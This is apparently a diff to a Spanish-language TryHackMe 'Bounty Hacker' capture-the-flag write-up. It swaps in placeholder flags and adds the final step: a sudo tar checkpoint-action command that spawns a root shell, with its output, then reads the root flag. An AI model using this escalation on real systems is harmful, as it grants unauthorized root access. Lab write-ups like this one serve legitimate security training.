@@ -153,7 +153,7 @@ user.txt
 Encontramos la Flag del USER.
 ```bash
 lin@bountyhacker:~/Desktop$ cat user.txt 
-THM{Password}
+THM{UserFlag}
 ```
 Lo que ahora queda es encontrar una manera de escalar nuestros privilegios para convertirnos en root y eventualmente conseguir la flag de root.
 ```bash
@@ -173,6 +173,15 @@ Mi primer lugar es ir siempre a https://gtfobins.github.io/ para buscar posibles
 Busque **tar** en la barra de búsqueda y haga clic en la misma, desplácese hacia abajo hasta SUDO.
 ![GTFObinsudo](https://imgur.com/Zu8aHVo)
 
+Siempre debes leer la descripción. Se ve bastante bien para mí, no puedo resistirme a ejecutarlo y obtener root. Vamos a ver. Dedos cruzados..
 ```bash
-sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+tar: Removing leading `/' from member names
+# whoami
+root
 ```
+Hemos elevado con éxito nuestros privilegios y podemos confirmar que ahora somos root.
+Tengo una última cosa que hacer y hemos terminado.. Necesitamos obtener la Flag de Root.
+```bash
+cat /root/root.txt
+THM{RootFlag}
